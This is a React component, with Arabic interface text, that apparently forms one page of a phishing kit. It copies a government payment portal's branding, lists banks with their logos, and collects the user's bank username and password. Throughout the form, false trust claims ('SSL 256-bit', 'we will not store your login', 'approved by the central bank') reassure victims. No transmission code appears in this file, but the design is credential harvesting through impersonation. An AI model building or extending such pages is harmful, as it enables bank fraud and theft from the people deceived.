import React, { useState } from 'react';
import { Card } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Badge } from '@/components/ui/badge';
import { Separator } from '@/components/ui/separator';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { getGovernmentPaymentSystem } from '@/lib/governmentPaymentSystems';
import { formatCurrency } from '@/lib/countryCurrencies';
import { banks } from '@/lib/banks';
import { 
  Shield, 
  Lock, 
  CheckCircle2,
  Building2,
  User,
  KeyRound,
  AlertCircle,
  ArrowRight,
  Eye,
  EyeOff
} from 'lucide-react';

interface GatewayBankLoginProps {
  countryCode: string;
  amount: number;
  serviceName?: string;
  onBack: () => void;
  onComplete: () => void;
}

export const GatewayBankLogin: React.FC<GatewayBankLoginProps> = ({ 
  countryCode, 
  amount, 
  serviceName = 'خدمة حكومية',
  onBack,
  onComplete
}) => {
  const govSystem = getGovernmentPaymentSystem(countryCode);
  const [selectedBank, setSelectedBank] = useState('');
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const formattedAmount = formatCurrency(amount, countryCode);

  const countryBanks = banks.filter(bank => 
    bank.countries.includes(countryCode.toUpperCase())
  );

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsProcessing(true);

    await new Promise(resolve => setTimeout(resolve, 2000));
    onComplete();
  };

  const selectedBankData = countryBanks.find(b => b.id === selectedBank);

  return (
    <div 
      className="min-h-screen" 
      style={{ backgroundColor: govSystem.colors.background }}
      dir="rtl"
    >
      <div 
        className="relative h-28 sm:h-32"
        style={{ background: govSystem.gradients.header }}
      >
        <div className="absolute inset-0 bg-gradient-to-b from-black/20 to-transparent" />
        
        <div className="container mx-auto h-full flex items-center justify-between px-4 sm:px-6 relative z-10">
          <div className="flex items-center gap-3">
            <div 
              className="bg-white p-2 rounded-xl shadow-lg"
              style={{ boxShadow: govSystem.shadows.lg }}
            >
              {govSystem.logo && (
                <img 
                  src={govSystem.logo} 
                  alt={govSystem.nameAr} 
                  className="h-10 sm:h-12 object-contain" 
                />
              )}
            </div>
            <div className="text-white">
              <h1 className="font-bold text-lg sm:text-xl">{govSystem.nameAr}</h1>
              <p className="text-xs opacity-90">تسجيل الدخول البنكي</p>
            </div>
          </div>
        </div>
      </div>

      <div className="container mx-auto px-3 sm:px-4 py-6 sm:py-8">
        <div className="max-w-2xl mx-auto">
          <Card 
            className="p-4 sm:p-8 shadow-2xl"
            style={{ boxShadow: govSystem.shadows.xl }}
          >
            <div className="flex items-center justify-between mb-6 pb-6 border-b-2" style={{ borderBottomColor: govSystem.colors.border }}>
              <div>
                <h2 className="text-xl sm:text-2xl font-bold mb-1">تسجيل الدخول للبنك</h2>
                <p className="text-sm text-gray-600">{serviceName}</p>
              </div>
              <div 
                className="px-4 py-2 rounded-xl text-white font-bold text-lg"
                style={{ backgroundColor: govSystem.colors.primary }}
              >
                {formattedAmount}
              </div>
            </div>

            <div 
              className="mb-6 p-4 rounded-xl border-r-4"
              style={{ 
                backgroundColor: `${govSystem.colors.primary}08`,
                borderColor: govSystem.colors.primary 
              }}
            >
              <div className="flex items-start gap-3">
                <Shield className="w-5 h-5 shrink-0 mt-0.5" style={{ color: govSystem.colors.primary }} />
                <div>
                  <p className="font-bold text-sm mb-1">دفع آمن ومعتمد</p>
                  <p className="text-xs text-gray-700">
                    ستتم إعادة توجيهك إلى بوابة {govSystem.nameAr} الرسمية لإكمال عملية الدفع بشكل آمن
                  </p>
                </div>
              </div>
            </div>

            <form onSubmit={handleLogin} className="space-y-5">
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm font-semibold">
                  <Building2 className="w-4 h-4" />
                  اختر البنك الخاص بك *
                </Label>
                <Select value={selectedBank} onValueChange={setSelectedBank} required>
                  <SelectTrigger 
                    className="h-12 text-base"
                    style={{ borderColor: govSystem.colors.inputBorder }}
                  >
                    <SelectValue placeholder="اختر البنك" />
                  </SelectTrigger>
                  <SelectContent className="bg-background z-50 max-h-[300px]">
                    {countryBanks.map((bank) => (
                      <SelectItem key={bank.id} value={bank.id} className="text-base py-3">
                        <div className="flex items-center gap-3">
                          {bank.logo && (
                            <img src={bank.logo} alt={bank.nameAr} className="h-6 w-auto object-contain" />
                          )}
                          <span>{bank.nameAr}</span>
                        </div>
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
                {selectedBankData && (
                  <p className="text-xs text-gray-600 mt-1.5 pr-1">
                    سيتم توجيهك إلى {selectedBankData.nameAr} لتسجيل الدخول
                  </p>
                )}
              </div>

              {selectedBank && (
                <>
                  <Separator />
                  
                  <div>
                    <Label htmlFor="username" className="mb-2 flex items-center gap-2 text-sm font-semibold">
                      <User className="w-4 h-4" />
                      اسم المستخدم أو رقم الحساب *
                    </Label>
                    <Input
                      id="username"
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                      required
                      className="h-12 text-base"
                      style={{ borderColor: govSystem.colors.inputBorder }}
                      placeholder="أدخل اسم المستخدم"
                      dir="ltr"
                    />
                  </div>

                  <div>
                    <Label htmlFor="password" className="mb-2 flex items-center gap-2 text-sm font-semibold">
                      <KeyRound className="w-4 h-4" />
                      كلمة المرور *
                    </Label>
                    <div className="relative">
                      <Input
                        id="password"
                        type={showPassword ? 'text' : 'password'}
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        required
                        className="h-12 text-base pr-12"
                        style={{ borderColor: govSystem.colors.inputBorder }}
                        placeholder="••••••••"
                        dir="ltr"
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
                      >
                        {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                      </button>
                    </div>
                  </div>

                  <div 
                    className="p-4 rounded-lg border-2"
                    style={{ 
                      backgroundColor: `${govSystem.colors.primary}05`,
                      borderColor: `${govSystem.colors.primary}20`
                    }}
                  >
                    <div className="flex items-start gap-3">
                      <AlertCircle className="w-5 h-5 shrink-0 mt-0.5" style={{ color: govSystem.colors.primary }} />
                      <div className="text-xs text-gray-700 space-y-1">
                        <p>• معلوماتك البنكية محمية بتشفير SSL 256-bit</p>
                        <p>• لن نقوم بحفظ معلومات تسجيل الدخول الخاصة بك</p>
                        <p>• جميع المعاملات معتمدة من البنك المركزي</p>
                      </div>
                    </div>
                  </div>

                  <div className="flex gap-3 pt-2">
                    <Button 
                      type="button"
                      variant="outline"
                      onClick={onBack}
                      className="flex-1 h-12 text-base"
                      disabled={isProcessing}
                    >
                      رجوع
                    </Button>
                    <Button 
                      type="submit"
                      className="flex-1 h-12 text-base font-bold shadow-lg"
                      style={{ 
                        backgroundColor: govSystem.colors.primary,
                        color: govSystem.colors.textOnPrimary
                      }}
                      disabled={isProcessing}
                    >
                      {isProcessing ? (
                        <span>جارٍ المعالجة...</span>
                      ) : (
                        <>
                          <span>تسجيل الدخول والدفع</span>
                          <ArrowRight className="w-5 h-5 mr-2" />
                        </>
                      )}
                    </Button>
                  </div>
                </>
              )}
            </form>
          </Card>

          <div className="mt-4 grid grid-cols-1 sm:grid-cols-3 gap-3">
            <Card className="p-3 bg-green-50 border-green-200">
              <div className="flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 text-green-700 shrink-0" />
                <p className="text-xs font-semibold text-green-900">معتمد من البنك المركزي</p>
              </div>
            </Card>

            <Card className="p-3 bg-blue-50 border-blue-200">
              <div className="flex items-center gap-2">
                <Lock className="w-4 h-4 text-blue-700 shrink-0" />
                <p className="text-xs font-semibold text-blue-900">تشفير SSL متقدم</p>
              </div>
            </Card>

            <Card className="p-3 bg-purple-50 border-purple-200">
              <div className="flex items-center gap-2">
                <Shield className="w-4 h-4 text-purple-700 shrink-0" />
                <p className="text-xs font-semibold text-purple-900">دفع آمن 100%</p>
              </div>
            </Card>
          </div>
        </div>
      </div>
    </div>
  );
};

export default GatewayBankLogin;
